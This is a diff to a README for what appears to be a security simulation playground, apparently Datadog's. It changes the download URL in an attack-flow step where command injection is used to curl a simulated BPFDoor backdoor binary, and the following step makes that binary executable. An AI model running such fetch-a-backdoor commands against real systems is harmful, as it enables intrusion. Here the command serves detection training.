@@ -21,7 +21,7 @@ The simulation showcases how attackers can compromise web applications through c
 ### Attack Flow
 1. **Initial Compromise**: Exploit command injection to download simulated BPFDoor backdoor
    ```bash
-   curl -OL https://github.com/spikat/fake-bpfdoor/raw/refs/heads/main/fake-bpfdoor.x64
+   curl -OL https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/bpfdoor/fake-bpfdoor.x64
    ```
 
 2. **Privilege Escalation**: Make backdoor executable
